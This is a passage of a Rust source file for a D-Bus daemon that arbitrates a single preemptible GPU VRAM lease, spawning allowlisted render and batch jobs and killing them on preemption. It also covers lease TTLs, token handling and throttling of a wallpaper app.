//! `lease` — the unified VRAM coordinator daemon (ADR-0006 control plane + ADR-0010).
//!
//! This is `coord` × `lease` merged into one process: it serves the **single exclusive,
//! preemptible VRAM lease** over the session bus AND owns the batch children, so a
//! preemption actually SIGKILLs the running job and reclaims VRAM — the headline behaviour
//! that the two earlier slices proved separately, now joined. ADR-0006 routes Hermes → a
//! D-Bus lease call → agentosd; this is the agentosd side.
//!
//! Two holder kinds, one lever:
//!   * **Cooperative** (`Acquire`): the caller runs + owns its own GPU process (Hermes
//!     interactive inference via the gateway) and must `Release` when done. agentosd owns
//!     nothing here — and never needs to, because `interactive` is the top tier (it
//!     preempts, is never preempted).
//!   * **Owned** (`Spawn`): agentosd spawns the job (ComfyUI/overnight batch) and holds its
//!     PID, so it can SIGKILL it on preemption (ADR-0009/0010 §5). The SIGKILL lever only
//!     ever lands on these.
//!
//! A higher-tier `Acquire`/`Spawn` that preempts the current owned holder SIGKILLs that
//! child (own-PID evict; `POST /free` is never on the path). A background supervisor reaps
//! a naturally-exited owned child and auto-releases its lease. Monotonic lease tokens mean
//! a preempted holder's stale `Release` (or its late supervisor reap) can't free a
//! successor's lease.
//!
//! The decision is the same deterministic core as `coord`: `admit` (predict-before-load,
//! ADR-0010 §4) + `arbitrate` (priority, §1/§2) + the pure, unit-tested `LeaseState`
//! (token issue/revoke). zbus + the owned-child plumbing are the thin shell (model
//! proposes, code disposes: no model output reaches the lease).
//!
//! Scope (ADR-0001): a lease server + process supervisor, not a scheduler. There is no
//! wait-queue yet — a losing acquirer is told `queued` and retries (real backpressure
//! comes from the gateway holding inference responses, ADR-0006). A revoke *signal* for
//! cooperative holders, and the Hermes plugin that calls this, are the remaining work.

use std::fs::File;
use std::process::Stdio;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::{Duration, Instant};

use crate::gpu::GpuBackend;
use tokio::process::{Child, Command};
use tokio::sync::Mutex;

use crate::coord::{admit, arbitrate, free_mib, Admission, CallerClass, Holder, LeaseDecision, Tier};
use crate::feed::feed_dir;
// ADR-0022 Phase 1: reclaim a flatpak-scoped Blender lane (cgroup.kill via a pinned dir-fd) — the
// process-group SIGKILL can't reach a lane flatpak reparents into a systemd scope. See `scope_reclaim`.
use crate::scope_reclaim::{self, ScopeHandle};
// The keyhole consumes `keyhole.json` (read-only); the lease daemon publishes its arbitration
// state to a sibling `lease.json` the keyhole producer merges in. Reusing the SAME type both
// sides (de)serialize keeps the contract locked (ADR-0012 §3).
use crate::keyhole::Lease;

/// Safety headroom kept free on a fresh grant (mirrors `coord` / ADR-0004 margins).
const HEADROOM_MIB: u64 = 512;

/// Conservative default footprint for the `eevee-render` profile (ADR-0023 P1). Distinct from the
/// `blender-render` Cycles wrapper, whose caller-supplied ~8000-MiB estimate would always DENY
/// against ComfyUI's ~5.8 GB residual headroom. EEVEE (rasteriser, no BVH/OptiX) is far lighter, so
/// a render can actually be admitted beside a warm model. A `Spawn` caller may still override this
/// with its own `estimate_mib`; this is the sane default the CLI hint advertises.
/// TODO: replace with a measured NVML delta under a leashed EEVEE run (the same calibration the
/// `// TODO: measured NVML delta` note on `blender-render` awaits).
const EEVEE_RENDER_EST_MIB: u32 = 3000;

/// After a scope reclaim (`cgroup.kill`), poll the pinned fd up to this many times for the lane to
/// empty before re-reading free VRAM, so the just-granted successor doesn't allocate into not-yet-freed
/// memory (review B2: `cgroup.kill` returns when the SIGKILL is *queued*, not when the driver freed the
/// VRAM). Bounded × `SCOPE_RECLAIM_POLL_INTERVAL` so a hung lane can't stall the caller forever (fail-open).
const SCOPE_RECLAIM_POLLS: u32 = 30;
const SCOPE_RECLAIM_POLL_INTERVAL: Duration = Duration::from_millis(100);

/// Bound on AWAITING a SIGKILLed owned child's reap before a preempt grant returns (ADR-0041 §5a —
/// the over-admit guard: a SIGKILL returns when the signal is *queued*, not when the driver freed the
/// VRAM, so the prior detached reap let a successor allocate into not-yet-freed memory). A SIGKILLed
/// process reaps in ms; this generous ceiling matches the Scope path's confirm budget
/// (`SCOPE_RECLAIM_POLLS` × interval ≈ 3 s). On timeout we detach a reaper and proceed (fail-open,
/// ADR-0003 — the next admission's true-free NVML read governs; a hung child can't stall the caller).
const SPAWNED_REAP_TIMEOUT: Duration = Duration::from_secs(3);

const BUS_NAME: &str = "org.agentos.Coordinator1";
const OBJ_PATH: &str = "/org/agentos/Coordinator1";

/// Static launch-profile allowlist (ADR-0013 A2). `Spawn` names an *intent*, never a binary —
/// the daemon owns the command vector, so a D-Bus caller can't make agentosd run arbitrary
/// commands. This closes the unauthenticated-RCE Critical (review finding S1): `Spawn(argv)` is
/// gone. `params` are appended as LITERAL argv (execv, no shell) → no injection. A new owned job
/// is a new entry here (a config file is the later step). Profile programs must resolve to an
/// absolute path so the `looks_executable` pre-flight (H3) actually checks them — repo-relative
/// entries are joined onto `repo_root()` at resolve time; a leading `/` is kept verbatim.
const PROFILES: &[(&str, &[&str])] = &[
    // The dreaming/overnight ComfyUI the daemon owns + can SIGKILL (ADR-0009/0010 §5).
    ("comfyui", &["spikes/dreaming/start-comfyui.sh"]),
    // A headless Blender Cycles render the daemon owns + can SIGKILL (ADR-0022 §3, Phase 0). The
    // wrapper execs `blender -b … --python render.py` (a FIXED, repo-owned script — never an agent
    // param) and caps Cycles' own VRAM so a heavy scene fails its frame, not the driver. The owned
    // PID is blender → SIGKILL frees the CUDA context. `params` carry only validated scalars.
    ("blender-render", &["integrations/blender/render-wrapper.sh"]),
    // A headless EEVEE render the daemon owns + can SIGKILL (ADR-0023 P1). DISTINCT from
    // `blender-render` purely so the daemon (and the operator) treat it as a LIGHT lane: EEVEE is a
    // rasteriser (no BVH/OptiX), so a render can actually be ADMITTED beside a warm model, whereas the
    // Cycles `blender-render`'s ~8000-MiB caller estimate would always DENY against ComfyUI's ~5.8 GB
    // residual headroom. The daemon-owned program is the SAME hardened, path-validated wrapper (the safe
    // entry point — engine selection is a render.py/wrapper concern, deferred per integrations/blender/
    // README §6); the difference that matters at the lease layer is the conservative default footprint
    // `EEVEE_RENDER_EST_MIB`, advertised in the CLI hint below.
    ("eevee-render", &["integrations/blender/render-wrapper.sh"]),
    // A harmless stand-in for smoke-testing the lease plumbing (params e.g. ["600"]).
    ("sleep", &["/usr/bin/sleep"]),
];

/// Repo root the daemon-owned launch profiles (start-comfyui.sh / render-wrapper.sh) live under.
/// `AGENTOSD_REPO_ROOT` overrides; otherwise `$HOME/Documents/AgentOS`. Absolute by construction so
/// the `looks_executable` pre-flight (H3) checks a real path — a wrong root just fails the pre-flight
/// and DENIES the spawn (fail-safe per ADR-0003); it can never widen the allowlist.
fn repo_root() -> String {
    std::env::var("AGENTOSD_REPO_ROOT")
        .ok()
        .filter(|s| !s.is_empty())
        .or_else(|| std::env::var("HOME").ok().map(|h| format!("{h}/Documents/AgentOS")))
        .unwrap_or_else(|| "/nonexistent/AgentOS".to_string())
}

/// Resolve a profile name to its daemon-owned base argv, or `None` if not allowlisted. A
/// repo-relative program (no leading `/`) is joined onto `repo_root()`; an absolute one is kept.
fn resolve_profile(name: &str) -> Option<Vec<String>> {
    PROFILES.iter().find(|(n, _)| *n == name).map(|(_, argv)| {
        argv.iter()
            .map(|s| {
                if s.starts_with('/') {
                    s.to_string()
                } else {
                    format!("{}/{}", repo_root(), s)
                }
            })
            .collect()
    })
}

fn profile_names() -> String {
    PROFILES.iter().map(|(n, _)| *n).collect::<Vec<_>>().join(", ")
}

/// Lease TTL backstop (ADR-0013 B5): a holder past this without a `Renew` is auto-expired, so a
/// stuck/buggy holder — or an owned job whose `Spawn` caller crashed (the gap B4 leaves) — can't
/// hold the lane forever. Default covers a full Wan 14B dream (~1 hr); `Renew` extends. Tunable
/// via `AGENTOSD_LEASE_TTL_SECS` (operational knob; also lets tests use a short value).
fn lease_ttl() -> Duration {
    let s = std::env::var("AGENTOSD_LEASE_TTL_SECS").ok().and_then(|s| s.parse().ok()).unwrap_or(5400);
    Duration::from_secs(s)
}

/// TTL for an AGENT-class cooperative lease (ADR-0021 ratification must-fix #3) — far shorter than the
/// 90-min `lease_ttl` dream backstop. An autonomous agent's liveness is less trustworthy than Hermes',
/// and behind a shared MCP connection B4 cannot see one sub-agent die (the spike, ADR-0021), so a
/// silent agent that abandoned its token would otherwise wedge the *batch* lane for 90 min (never the
/// desktop — the GO-1 clamp guarantees that). A ~90s TTL + the MCP server's `Renew` heartbeat reclaims
/// it within ~one TTL of the session going quiet. The MCP heartbeat DERIVES its cadence from this value
/// (`mcp::heartbeat_interval` = ttl/4) so the "tick faster than the TTL" coupling holds by construction
/// — not two env vars in two processes that can silently disagree (review: resource-safety Blocker).
/// `pub(crate)` for exactly that derivation. Tunable for tests/ops via `AGENTOSD_AGENT_LEASE_TTL_SECS`.
pub(crate) fn agent_lease_ttl() -> Duration {
    let s = std::env::var("AGENTOSD_AGENT_LEASE_TTL_SECS").ok().and_then(|s| s.parse().ok()).unwrap_or(90);
    Duration::from_secs(s)
}

/// The TTL to apply for a holder of the given trust class (ADR-0021 #3). Stored at acquire as
/// `holder_ttl` so `Renew` re-applies the SAME (short) agent TTL — never silently promoting an agent
/// lease to the 90-min default on its first heartbeat.
fn ttl_for(class: CallerClass) -> Duration {
    match class {
        CallerClass::Agent => agent_lease_ttl(),
        CallerClass::Trusted => lease_ttl(),
    }
}

/// Backoff hint (ms) surfaced to an agent on a `busy_retry` outcome. There is NO wait-queue (ADR-0001
/// scope: a loser retries, it holds no place), so this is a courtesy backoff so the agent doesn't
/// hot-loop — NOT a place-in-line or a release ETA. The C7 `cooling` outcome carries the *precise*
/// remaining dwell instead (the agent knows exactly when it may re-acquire).
const AGENT_BUSY_RETRY_HINT_MS: u64 = 2000;

/// Anti-strobe dwell (ADR-0013 C7): a just-preempted tier can't re-acquire for this long, so
/// bursty interactive load can't drive spawn→preempt→spawn churn (ComfyUI relaunch is costly).
/// Tunable via `AGENTOSD_PREEMPT_DWELL_SECS`.
fn preempt_dwell() -> Duration {
    let s = std::env::var("AGENTOSD_PREEMPT_DWELL_SECS").ok().and_then(|s| s.parse().ok()).unwrap_or(8);
    Duration::from_secs(s)
}

/// The UE wallpaper's throttled-FLOOR VRAM footprint (ADR-0029 D4) — the second of UE's two-number
/// footprint, against which the governor admits a higher tier when deciding throttle-vs-kill
/// (`coord::yield_decision`). The Phase-A packaged-runtime measurement on a trivial scene was ~1.0 GB
/// at the FLOOR rung (~1.2 GB FULL); a richer tableau must be re-measured before the budget is locked.
/// Tunable via `AGENTOSD_UE_FLOOR_MIB`.
fn ue_floor_mib() -> u64 {
    std::env::var("AGENTOSD_UE_FLOOR_MIB").ok().and_then(|s| s.parse().ok()).unwrap_or(1000)
}

/// ADR-0029 §3 — a registered throttleable wallpaper (UE). The daemon does NOT own its PID (UE launches
/// itself, the keep-below pattern); `pid` is recorded for liveness + a future kill backstop, while
/// `full_mib`/`floor_mib` are UE's two-number footprint (D4) feeding the throttle-vs-skip decision.
/// Registered via the `RegisterWallpaper` verb; `None` (the live default) makes the whole throttle path
/// dormant. `Copy` so it's read out of `Inner` without a clone and never reaches a `spawn_blocking`.
#[derive(Debug, Clone, Copy)]
struct Wallpaper {
    #[allow(dead_code)] // recorded for the deferred kill-to-shader-floor backstop + a liveness check.
    pid: u32,
    full_mib: u64,
    floor_mib: u64,
}

/// Minimum VRAM a full→floor throttle must free to be worth a (visible) wallpaper rung change. On a
/// trivial UE scene full≈floor — the throttle lever there is GPU-TIME, not VRAM (ADR-0029 Phase-A) — so
/// without this gate a heavy admission would flicker the wallpaper for ~0 MB of benefit. Tunable.
fn min_throttle_gain_mib() -> u64 {
    std::env::var("AGENTOSD_MIN_THROTTLE_GAIN_MIB").ok().and_then(|s| s.parse().ok()).unwrap_or(512)
}

/// Poll count + interval for the post-throttle free-VRAM re-measure (the §3 OOM guard). UE sheds VRAM
/// over several frames AFTER the RC call returns (the streaming pool drains, render targets resize) and
/// can briefly show a transient high before settling — so a single read can over-admit and OOM the card
/// (UE crashes, not degrades). Poll across ~1.5 s and take the conservative settled minimum.
const WALLPAPER_THROTTLE_POLLS: u32 = 6;
const WALLPAPER_THROTTLE_POLL_INTERVAL: Duration = Duration::from_millis(250);
/// Consecutive supervisor ticks (750 ms each) the lease must be FREE before UE is restored to full —
/// the anti-strobe dwell on the RESTORE edge, so chained dream sessions don't flicker UE full↔floor. 4
/// ≈ 3 s: long enough for the next beat/session to re-grab the lease (keeping UE floored) if it's coming.
const WALLPAPER_RESTORE_FREE_TICKS: u32 = 4;
/// A wallpaper-throttle in-flight claim older than this is STALE — its actuation can't legitimately take
/// this long (a 250 ms RC PUT + a ~1.5 s re-measure poll), so a claim still set past it leaked from a
/// dropped future and the supervisor clears it (the cancellation backstop, so a leak can't pin UE floored).
const WALLPAPER_INFLIGHT_STALE: Duration = Duration::from_secs(30);

/// C7: is `req` still in its post-preempt cooldown? Interactive is exempt — top priority must
/// never be delayed. Pure + tested (the time source is injected).
fn cooling_down(cooldown: Option<(Tier, Instant)>, req: Tier, now: Instant) -> bool {
    matches!(cooldown, Some((t, until)) if t == req && req != Tier::Interactive && now < until)
}

/// Anti-strobe dwell for the ADR-0018 §2 graceful warm-pool reclaim: once a reclaim is attempted, no
/// other request triggers another `ollama stop` storm for this long (so bursty heavy-lane admissions
/// can't thrash the warm pool — the warm-eviction anti-strobe the review panel required, item #6).
/// Tunable via `AGENTOSD_WARM_RECLAIM_DWELL_SECS`.
fn warm_reclaim_dwell() -> Duration {
    let s = std::env::var("AGENTOSD_WARM_RECLAIM_DWELL_SECS").ok().and_then(|s| s.parse().ok()).unwrap_or(10);
    Duration::from_secs(s)
}

/// ADR-0018 §2 gate (the tier + VRAM half — pure + tested). Should a request that's about to be
/// VRAM-denied first try a graceful warm-pool reclaim? ONLY the heavy lane that fails *closed* today
/// (`Batch`/`BestEffort`), and ONLY on a real shortfall against a *readable* card. `Interactive` is
/// deliberately untouched: it fails OPEN (ADR-0003) and must never be delayed by an `ollama stop`.
/// `None` free (unreadable NVML) is never eligible — never unload the warm pool blind. The lease-free
/// and anti-strobe-dwell checks are runtime state (decided under the lock), not part of this gate.
fn warm_reclaim_eligible(tier: Tier, free_opt: Option<u64>, est: u64, headroom: u64) -> bool {
    matches!(tier, Tier::Batch | Tier::BestEffort)
        && matches!(free_opt, Some(free) if !admit(free, est, headroom).granted())
}

/// ADR-0029 §3 throttle-before-deny gate (the PURE half — unit-tested). Should a request that's about
/// to be VRAM-denied first ask the registered wallpaper to throttle to its FLOOR rung so the gen can
/// COEXIST on the freed VRAM? Eligible iff: a wallpaper is registered; the request is the heavy lane
/// that fails closed (`Batch`/`BestEffort` — `Interactive` fails open and must never be delayed by an
/// RC round-trip); free is READABLE and the request would DENY at it; the full→floor gain meets the
/// worthwhile floor (no flicker for ~0 MB); and `yield_decision` (the pure two-number-footprint call)
/// says the gen would then coexist (not need a kill). Runtime state — already-throttled, in-flight, the
/// anti-strobe dwell — is checked under the lock by the caller, NOT here (mirrors `warm_reclaim_eligible`).
fn wallpaper_throttle_eligible(
    tier: Tier,
    free_opt: Option<u64>,
    est: u64,
    headroom: u64,
    wp: Option<Wallpaper>,
    min_gain: u64,
) -> bool {
    let Some(wp) = wp else { return false };
    if !matches!(tier, Tier::Batch | Tier::BestEffort) {
        return false;
    }
    let Some(free) = free_opt else { return false }; // unreadable NVML → never throttle blind
    if admit(free, est, headroom).granted() {
        return false; // wouldn't deny → nothing to throttle for
    }
    if wp.full_mib.saturating_sub(wp.floor_mib) < min_gain {
        return false; // negligible VRAM gain (a trivial scene) → not worth a visible rung change
    }
    matches!(
        crate::coord::yield_decision(free, wp.full_mib, wp.floor_mib, est, headroom),
        crate::coord::YieldOutcome::ThrottleAndCoexist
    )
}

/// Re-measure free VRAM after a wallpaper throttle, CONSERVATIVELY (the §3 OOM guard). UE sheds VRAM
/// over several frames AFTER the RC call returns and can briefly show a transient high mid-resize before
/// settling, so a single read can over-admit and OOM the card. Poll across the window and return the
/// MINIMUM of the SETTLED tail (the latter half of the readings — UE has had the first half to shed), so
/// a transient peak can never over-admit; a too-low read just denies (safe) and the caller's retry
/// re-admits once UE has settled. Mirrors `reclaim.rs`'s poll-don't-predict discipline. `None` if NVML
/// stays unreadable (→ the locked `admit` denies — never admit blind).
async fn poll_free_settled(gpu: &Arc<GpuBackend>) -> Option<u64> {
    let mut reads: Vec<u64> = Vec::new();
    for i in 0..WALLPAPER_THROTTLE_POLLS {
        if i > 0 {
            tokio::time::sleep(WALLPAPER_THROTTLE_POLL_INTERVAL).await;
        }
        if let Some(f) = free_mib(gpu).await {
            reads.push(f);
        }
    }
    if reads.is_empty() {
        return None;
    }
    let tail = &reads[reads.len() / 2..];
    tail.iter().copied().min()
}

// ---------------------------------------------------------------------------
// Pure lease state machine (the only new decision logic — unit-tested below).
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct Held {
    tier: Tier,
    token: u64,
    /// The footprint this holder was admitted for — so a preempt can predict the free
    /// VRAM after evicting it (H1: complete the preempt decision, not just priority).
    est_mib: u64,
}

/// Outcome of an `acquire` against the single lease.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum AcquireResult {
    /// Lease was free and the footprint fit → granted with a fresh token.
    Granted { token: u64 },
    /// A higher tier displaced a lower holder → granted; `victim` must be evicted.
    Preempted { token: u64, victim: u64 },
    /// Held by an equal-or-higher tier → the requester must wait/retry.
    Queued,
    /// Lease was free but predict-before-load refused (would not fit) — ADR-0010 §4.
    Denied,
}

/// Stable, machine-mappable outcome of an admission attempt (ADR-0021 ratification must-fix #2). The
/// daemon emits a CODE (never free-text prose) so the MCP act layer maps codes, never strings — the
/// pre-ratification act-verb branch parsed prose (`outcome.starts_with("denied")`), which the panel
/// flagged as fragile. The trusted D-Bus verbs still surface the human prose (`AcquireOutcome::msg`)
/// for `lease_client.py` + logs — only the agent verb (`AcquireAgent`) reads the typed code.
///
/// `unavailable` is NOT in this set: the daemon never returns it — it is the MCP layer's fail-CLOSED
/// posture when the daemon is unreachable/timed-out (ADR-0021 #4), emitted in `mcp.rs`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum OutcomeCode {
    /// Lease granted — `token` is non-zero.
    Granted,
    /// Held by an equal-or-higher tier → retry (NO wait-queue; the loser holds no place). Carries
    /// `AGENT_BUSY_RETRY_HINT_MS` as a courtesy backoff.
    BusyRetry,
    /// Predict-before-load refused — `short_mib` is the deficit.
    Denied,
    /// C7 anti-strobe: a just-preempted tier is in its cooldown → retry after `retry_after_ms` (the
    /// precise remaining dwell). The MCP layer FOLDS this into the agent-visible `busy_retry`
    /// (design 0020 surfaces only granted|busy_retry|denied to the agent), retryable — never a bare failure.
    Cooling,
    /// The request was malformed (bad tier name, empty/non-executable spawn argv, spawn failure).
    Error,
}

impl OutcomeCode {
    /// The stable wire string the MCP layer matches on (never prose).
    fn as_str(self) -> &'static str {
        match self {
            OutcomeCode::Granted => "granted",
            OutcomeCode::BusyRetry => "busy_retry",
            OutcomeCode::Denied => "denied",
            OutcomeCode::Cooling => "cooling",
            OutcomeCode::Error => "error",
        }
    }
}

/// The typed verdict `do_acquire` returns. Each D-Bus verb shapes it for its OWN wire contract:
///   * the trusted verbs (`Acquire`/`Spawn`/`AdoptScope`) → `(granted, token, prose)` — the EXACT
///     existing shape, so `lease_client.py` + the `busctl` smoke tests are byte-for-byte unaffected;
///   * the agent verb (`AcquireAgent`) → `(granted, token, code, tier_effective, short_mib,
///     retry_after_ms)` — typed, numeric, prose-free (ADR-0021 #2).
#[derive(Debug, Clone)]
struct AcquireOutcome {
    code: OutcomeCode,
    /// 0 unless granted.
    token: u64,
    /// The CLAMPED tier the request was evaluated at (GO-1) — `""` only when the tier name was
    /// unparseable. Surfaced to the agent so the clamp is honest (asked `interactive`, got `batch`).
    tier_effective: String,
    /// Human prose for the trusted verbs' wire `msg` + the daemon log. NEVER parsed by the agent path.
    msg: String,
    /// Deficit in MiB when `Denied` (else 0).
    short_mib: u64,
    /// Backoff hint (ms) when `BusyRetry`/`Cooling` (else 0).
    retry_after_ms: u64,
}

impl AcquireOutcome {
    fn is_granted(&self) -> bool {
        matches!(self.code, OutcomeCode::Granted)
    }

    /// Trusted-verb wire shape (UNCHANGED): `(granted, token, prose)`.
    fn into_trusted_reply(self) -> (bool, u64, String) {
        (self.is_granted(), self.token, self.msg)
    }

    /// Agent-verb wire shape: `(granted, token, code, tier_effective, short_mib, retry_after_ms)`.
    /// `short_mib`/`retry_after_ms` saturate into `u32` for the D-Bus `u` fields.
    fn into_agent_reply(self) -> (bool, u64, String, String, u32, u32) {
        (
            self.is_granted(),
            self.token,
            self.code.as_str().to_string(),
            self.tier_effective,
            self.short_mib.min(u32::MAX as u64) as u32,
            self.retry_after_ms.min(u32::MAX as u64) as u32,
        )
    }
}

/// How a fresh lease install mints its holder token (ADR-0021 ratification must-fix #5). The random
/// value is generated in the impure shell (`do_acquire`), keeping `LeaseState` pure + deterministically
/// testable — the pure core just installs whatever token it is handed.
#[derive(Debug, Clone, Copy)]
enum TokenKind {
    /// Monotonic sequential — the trusted Hermes/human/CLI path (and every existing caller). Keeps the
    /// stale-release guard's simple invariant and the predictable token values the `busctl` smoke tests
    /// and pure unit tests assert.
    Sequential,
    /// A caller-supplied unguessable random token — the agent act path, so a sibling behind a shared
    /// MCP connection can't ENUMERATE a live token. Defence-in-depth ONLY: authorization rests on
    /// `holder_peer` identity binding (+ the MCP layer-2 session table), never on the token being secret.
    Random(u64),
}

/// The single exclusive lease (ADR-0010 §1). Trusted tokens are monotonic so a stale `Release`
/// from a preempted holder can't free a successor's lease; agent tokens are random (#5) — both
/// guarantee a fresh holder's token differs from the evicted one.
#[derive(Debug)]
pub struct LeaseState {
    holder: Option<Held>,
    next_token: u64,
}

impl LeaseState {
    pub fn new() -> Self {
        LeaseState { holder: None, next_token: 1 }
    }

    /// Decide + mutate. `admission` (computed from live NVML by the caller) keeps NVML
    /// out of this testable core. Admission gates only a *fresh* grant (predict-before-load,
    /// ADR-0010 §4). A preemption is decided by **priority** (`arbitrate`) — the lower tier
    /// must always yield — and the new holder is installed with its own `est`; the caller
    /// re-checks fit against post-eviction free VRAM (H1) and acts on the verdict.
    pub fn acquire(&mut self, tier: Tier, admission: &Admission) -> AcquireResult {
        self.acquire_with(tier, admission, TokenKind::Sequential)
    }

    /// `acquire`, choosing how the granted token is minted (ADR-0021 #5). The trusted path uses
    /// `Sequential`; the agent path passes `Random(_)` so a shared-connection sibling can't enumerate
    /// a live token. Same arbitration + admission core regardless — only the token VALUE differs.
    fn acquire_with(&mut self, tier: Tier, admission: &Admission, tk: TokenKind) -> AcquireResult {
        let est = admission.est_mib();
        match arbitrate(self.holder.map(|h| Holder { tier: h.tier }), tier) {
            LeaseDecision::Queue => AcquireResult::Queued,
            LeaseDecision::Preempt => {
                // arbitrate returns Preempt only when a holder exists.
                let Some(victim) = self.holder else { return AcquireResult::Queued };
                let token = self.install(tier, est, tk);
                AcquireResult::Preempted { token, victim: victim.token }
            }
            LeaseDecision::Grant => {
                if !admission.granted() {
                    return AcquireResult::Denied;
                }
                let token = self.install(tier, est, tk);
                AcquireResult::Granted { token }
            }
        }
    }

    /// Release the lease iff `token` is the current holder's (monotonic-token guard).
    pub fn release(&mut self, token: u64) -> bool {
        if self.holder.map(|h| h.token) == Some(token) {
            self.holder = None;
            true
        } else {
            false
        }
    }

    pub fn holder_tier(&self) -> Option<Tier> {
        self.holder.map(|h| h.tier)
    }

    pub fn holder_token(&self) -> u64 {
        self.holder.map_or(0, |h| h.token)
    }

    /// The current holder's admitted footprint estimate (for the preempt fit re-check).
    pub fn holder_est(&self) -> Option<u64> {
        self.holder.map(|h| h.est_mib)
    }

    /// Install `tier` (admitted for `est_mib`) as the sole holder with a fresh token minted per `tk`
    /// (ADR-0021 #5): monotonic sequential for trusted callers, or the supplied unguessable random
    /// value for the agent path. (A random token never advances `next_token`; a later sequential token
    /// colliding with a live random one is ~1/2^64 and harmless — the holder is overwritten atomically.)
    fn install(&mut self, tier: Tier, est_mib: u64, tk: TokenKind) -> u64 {
        let token = match tk {
            TokenKind::Sequential => {
                let t = self.next_token;
                self.next_token += 1;
                t
            }
            TokenKind::Random(t) => t,
        };
        self.holder = Some(Held { tier, token, est_mib });
        token
    }
}

impl Default for LeaseState {
    fn default() -> Self {
        Self::new()
    }
}

// ---------------------------------------------------------------------------
// Owned-child plumbing (the impure shell — kept out of the tested core).
// ---------------------------------------------------------------------------

/// How the lease reclaims the GPU from an owned holder. The lever differs by how the holder was
/// launched, and that difference is the whole of ADR-0022 Phase 1:
///   * `Spawned`  — agentosd spawned the job, so it owns the `Child` (reaping) + a process group it can
///     negative-PID SIGKILL (`sigkill_group`). The existing ComfyUI/batch path.
///   * `Scope`    — an externally-launched flatpak Blender **lane** that flatpak reparented into a
///     systemd scope (so a group SIGKILL can't reach it). Reclaimed by SIGKILLing the whole cgroup
///     scope (`cgroup.kill`) via a dir-fd pinned at adopt time. agentosd did NOT spawn it → there is no
///     `Child`, and `Release` must NOT kill it (it's the user's authoring app; it exits on its own).
enum Reclaim {
    Spawned { child: Child, pid: u32 },
    Scope { handle: ScopeHandle, dir: File, lane_pid: u32 },
}

/// A GPU job that owns the single lease and can be reclaimed on preemption — either an agentosd-spawned
/// child or an adopted flatpak lane scope (the `reclaim` field carries which, ADR-0013 + ADR-0022).
struct OwnedJob {
    token: u64,
    label: String,
    reclaim: Reclaim,
}

/// What the caller is asking the lease for — the cooperative/owned/adopted distinction, threaded into the
/// shared `do_acquire` core so the admission + arbitration + GO-1 clamp are identical on every path.
enum AcquireKind {
    /// `Acquire` — the caller runs + owns its own GPU process (Hermes interactive inference).
    Cooperative,
    /// `Spawn` — agentosd spawns + owns a child from an allowlisted profile (ComfyUI/batch).
    Spawn(Vec<String>),
    /// `AdoptScope` — agentosd records a flatpak lane's already-running cgroup scope as the reclaim
    /// handle (ADR-0022 Phase 1). `handle`/`dir` are resolved + pinned by the daemon, never caller input.
    AdoptScope { handle: ScopeHandle, dir: File, lane_pid: u32 },
}

/// The daemon's shared mutable state: the lease decision + the at-most-one owned child
/// (one lease holder → at most one owned process). One `Mutex` keeps the lease and the
/// child it controls atomically consistent.
struct Inner {
    lease: LeaseState,
    owned: Option<OwnedJob>,
    /// Human narration of the preempt that shaped the current holder, for the keyhole's
    /// arbitration line ("" = no contention). Set on preempt, cleared on a fresh/idle lease.
    last_preempt: String,
    /// The D-Bus unique name of the current holder + its token (ADR-0013 B4). When that peer
    /// disconnects (crash), the supervisor auto-releases the lease so a dead holder can't wedge
    /// the lane forever (finding H4). `None` for a holder with no bus name (owned jobs).
    holder_peer: Option<(u64, String)>,
    /// When the current holder's lease expires absent a `Renew` (ADR-0013 B5). `None` = no holder.
    holder_deadline: Option<Instant>,
    /// The TTL the current holder was admitted with (ADR-0021 #3) — stored so `Renew` re-applies the
    /// SAME (per-class) interval rather than silently promoting an agent's short lease to the 90-min
    /// default on its first heartbeat. `None` = no holder (falls back to `lease_ttl`).
    holder_ttl: Option<Duration>,
    /// A just-preempted tier and when its anti-strobe cooldown ends (ADR-0013 C7).
    cooldown: Option<(Tier, Instant)>,
    /// When the last ADR-0018 §2 graceful warm-pool reclaim was *attempted* (marked at attempt
    /// start, under the lock). Its dwell (`warm_reclaim_dwell`) blocks back-to-back `ollama stop`
    /// storms — the warm-eviction anti-strobe the review panel required (ADR-0018 #6). `None` = never.
    last_warm_reclaim: Option<Instant>,
    /// ADR-0029 §3 — a registered throttleable wallpaper (UE), or `None` (the live default → the whole
    /// throttle path is dormant). The daemon does NOT own its PID. Set/cleared by Register/Unregister.
    throttleable_wallpaper: Option<Wallpaper>,
    /// True while UE is held at its FLOOR rung by the daemon so a gen coexists on the freed VRAM. The
    /// supervisor restores UE to full (clears this) the moment NO gen holds the lease — the INVARIANT
    /// restore that catches every release path (explicit/natural-exit/TTL/peer-disconnect/preempt/deny).
    wallpaper_throttled: bool,
    /// `Some(when)` while a throttle OR restore RC call is in flight (claimed at `when`). Serializes the
    /// two off-lock actuations so a throttle (do_acquire) and a restore (supervisor) can never race UE
    /// into an indeterminate rung. Carries the claim INSTANT so the supervisor can self-heal a flag that
    /// leaked because its `do_acquire` future was dropped mid-throttle (cancellation) — a stale claim
    /// past `WALLPAPER_INFLIGHT_STALE` is cleared, so a dropped future can't pin UE at floor forever.
    wallpaper_throttle_inflight: Option<Instant>,
    /// When the last wallpaper throttle was *attempted* (the anti-strobe dwell on the THROTTLE edge,
    /// mirroring `last_warm_reclaim`). `None` = never.
    last_wallpaper_throttle: Option<Instant>,
    /// Consecutive supervisor ticks the lease has been FREE while UE is throttled — the restore-edge
    /// anti-strobe (a chained session re-grabs the lease before `WALLPAPER_RESTORE_FREE_TICKS` elapses).
    wallpaper_free_ticks: u32,
    /// ADR-0041 drain-on-free signal: a monotonic counter bumped whenever the lease transitions to
    /// holder-none (released / natural-exit / TTL / peer-disconnect) — i.e. cross-workflow VRAM
    /// capacity may have increased. Stamped into the `lease.json` mirror (`lease_snapshot`) so the
    /// VRAM-demand arbiter (`agentosd queue`, ADR-0041 Layer 1) wakes (inotify) and re-nominates a
    /// waiter, with the poll floor as the fail-open backstop. NEVER bumped on a fresh grant or a
    /// preempt — those don't free capacity for a waiter (the preemptor took the lease). Per-instance
    /// (one daemon per process) so the bump is unit-testable; the daemon gains NO wait-queue state.
    freed_seq: u64,
}

impl Inner {
    fn new() -> Self {
        Inner {
            lease: LeaseState::new(),
            owned: None,
            last_preempt: String::new(),
            holder_peer: None,
            holder_deadline: None,
            holder_ttl: None,
            cooldown: None,
            last_warm_reclaim: None,
            throttleable_wallpaper: None,
            wallpaper_throttled: false,
